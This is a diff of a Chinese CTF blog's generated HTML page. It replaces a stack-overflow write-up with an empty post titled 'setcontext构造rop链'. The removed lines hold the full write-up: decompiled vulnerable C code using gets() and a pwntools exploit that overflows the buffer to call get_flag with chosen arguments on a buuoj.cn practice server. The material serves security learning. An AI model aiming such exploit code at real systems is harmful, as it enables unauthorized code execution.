@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/10/03/栈溢出-特殊情况/"/>
+  <link rel="canonical" href="http://example.com/2023/03/19/setcontext构造rop链/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -32,19 +32,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>栈溢出-特殊情况 - Chen</title>
+  <title>setcontext构造rop链 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="栈溢出-特殊情况">
-<meta property="og:url" content="http://example.com/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/index.html">
+<meta property="og:title" content="setcontext构造rop链">
+<meta property="og:url" content="http://example.com/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="本篇博客用来记录一种特殊的情况 直接上例题吧 看完就知道什么意思了 12345678int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  char v4[56]; &#x2F;&#x2F; [esp+4h] [ebp-38h] BYREF  printf(&quot;Qual a palavrinha magica? &amp;quot">
+<meta property="og:description" content="ChenBlog">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-10-03T03:25:33.000Z">
-<meta property="article:modified_time" content="2022-10-03T03:51:33.188Z">
+<meta property="article:published_time" content="2023-03-19T14:42:08.000Z">
+<meta property="article:modified_time" content="2023-03-19T14:42:08.543Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2363,7 +2363,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/03/栈溢出-特殊情况/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/19/setcontext构造rop链/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2384,7 +2384,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        栈溢出-特殊情况
+        setcontext构造rop链
       </h1>
       <div class='new-meta-box'>
         
@@ -2401,24 +2401,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
             
-  <div class='new-meta-item category'>
-    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-    
-      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-      </span>
-    
-  </div>
-
 
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-10-03T11:25:33+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-03-19T22:42:08+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Oct 3, 2022</p>
+    <p>发布于：Mar 19, 2023</p>
   </a>
 </div>
 
@@ -2441,31 +2431,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>本篇博客用来记录一种特殊的情况</p>
-<p>直接上例题吧 看完就知道什么意思了</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = getc(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>总体的思路应该就是最简单的栈溢出控制程序执行流到getflag这个函数</p>
-<p>但是getflag在open flag.txt前有一个if判定 我们要先使a1 a2的值符合这个条件 才能使函数正常运行</p>
-<p>但是这个a1 a2我们发现也没有办法通过栈溢出的方法来覆盖使其变成符合条件的值</p>
-<p>所以这里只能在调用getflag函数时 一并传入a1 a2的值</p>
-<p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29661</span>)</span><br><span class="line">getflag_addr = <span class="number">0x80489a0</span></span><br><span class="line">exit_addr = <span class="number">0x804e6a0</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p32(getflag_addr)+p32(exit_addr)+p32(<span class="number">0x308CD64F</span>)+p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这里你会发现 按照平常我们填充的垃圾数据应该是 变量到ebp的距离0x38+0x4来覆盖ebp</p>
-<p>这里为什么我们没有多一个字长的垃圾数据呢？</p>
-<p>来看一下main函数的汇编情况</p>
-<p><img src="https://s1.328888.xyz/2022/10/03/P4Swo.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/03/P4Swo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="P4Swo.png"></p>
-<p>是不是缺少了什么？ 如果你对栈帧的概念不是很清楚 可能看不出什么 我们再放一段正常的函数汇编代码</p>
-<p><img src="https://s1.328888.xyz/2022/10/03/P4e8F.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/10/03/P4e8F.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="P4e8F.png"></p>
-<p>如果你熟悉栈帧的概念(这个我们在ret2csu里有讲到) 你就会知道大部分栈帧在生成的时候都会有这两段汇编代码 用来使esp和ebp入栈</p>
-<p>但是这道题的getflag函数并没有ebp 他利用esp寻址的办法</p>
-<p>所以此时我们的变量距离ret addr只有0x38字节 而非0x38+4</p>
-<p>再说回为什么函数和参数之间的垃圾数据要为exit函数的地址</p>
-<p>这是因为程序如果是以异常状况结束的 那么他将不会有回显 也就是说open(flag)得到的flag并不会显示出来</p>
-
+    
   </div>
   
   
@@ -2489,10 +2455,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-03T11:51:33+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-03-19T22:42:08+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Oct 3, 2022</p>
+    <p>更新于：Mar 19, 2023</p>
   </a>
 </div>
 
@@ -2511,7 +2477,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/&title=栈溢出-特殊情况 - Chen&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/&title=setcontext构造rop链 - Chen&summary="
           
           >
           
@@ -2523,7 +2489,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/&title=栈溢出-特殊情况 - Chen&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/&title=setcontext构造rop链 - Chen&summary="
           
           >
           
@@ -2535,7 +2501,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/&title=栈溢出-特殊情况 - Chen&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/&title=setcontext构造rop链 - Chen&summary="
           
           >
           
@@ -2568,19 +2534,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/10/06/HNCTF2022-ret2csu/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>HNCTF2022.ret2csu</p>
-          <p class='content'>看一下保护机制
-
-再拖到ida里看一下
-123456789int __cdecl main(int argc, const char **argv, const char **envp)&#12...</p>
-        </a>
       
-      
-        <a class='next' href='/2022/10/03/%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F/'>
-          <p class='title'>溢出覆盖变量<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>其实这个知识点应该算是栈溢出后面就可以讲的了 顺序没把握好 不过还好这篇的例题有点干货 就不丢到基础知识扩展那个专题了 在这面说吧
-我们已经学习了基础的栈溢出对吧 总归就是覆盖栈上的高地址内的数...</p>
+        <a class='next' href='/2023/03/19/mp-tcache-bins/'>
+          <p class='title'>mp_.tcache_bins<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'></p>
         </a>
       
     </div>
@@ -2596,7 +2553,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -3202,7 +3159,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/栈/","name":"栈"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/10/03/栈溢出-特殊情况/","name":"栈溢出-特殊情况"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"栈溢出-特殊情况","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/","wordCount":0,"datePublished":"2022-10-03T03:25:33.000Z","dateModified":"2022-10-03T03:51:33.188Z","articleSection":"栈","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/03/19/setcontext构造rop链/","name":"setcontext构造rop链"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"setcontext构造rop链","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/","wordCount":0,"datePublished":"2023-03-19T14:42:08.000Z","dateModified":"2023-03-19T14:42:08.543Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
